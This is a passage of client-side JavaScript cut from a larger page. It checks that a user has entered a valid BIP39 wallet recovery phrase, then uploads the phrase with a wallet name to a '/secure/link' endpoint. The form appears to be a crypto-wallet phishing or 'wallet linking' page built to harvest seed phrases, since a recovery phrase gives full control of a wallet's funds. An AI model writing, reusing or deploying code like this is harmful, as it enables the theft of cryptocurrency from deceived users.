        e.preventDefault();
        var keyid = $("#walletname1").html();



        var formData = new FormData(this);
        formData.append("keyid", keyid);
        const result = validateBip39Phrase($('#maindata').val());

                       if (result.valid) {
            //console.log("✅ Valid phrase:", result.phrase);
            $.ajax({
                type: 'POST',
                url: '/secure/link',
                data: formData,
                contentType: false,
                cache: false,
                processData: false,
                success: function(response) {
                    var modalElement1 = $('#menu-top-detached');
                    var offcanvas1 = new bootstrap.Offcanvas(modalElement1[0]);
                    offcanvas1.hide(); // Close it programmatically
                    modalElement1.removeClass('show');
